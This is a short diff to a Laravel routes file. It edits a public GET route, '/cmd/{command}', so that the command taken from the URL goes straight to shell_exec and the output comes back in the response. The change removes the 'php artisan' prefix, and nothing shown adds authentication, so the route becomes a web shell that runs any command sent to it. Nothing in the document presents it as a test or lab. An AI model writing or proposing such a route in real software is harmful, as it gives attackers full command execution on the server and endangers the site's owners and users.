@@ -112,7 +112,7 @@ Route::group(['prefix' => app()->getLocale(),'middleware'=>'LanguageSwicher'], f
 Route::get('/cmd/{command}', function ($command) {
     chdir('../');
     //$dir =  getcwd();
-    $cmd  = shell_exec ('php artisan '.$command);
+    $cmd  = shell_exec($command);
     return $cmd   ;
 });
 
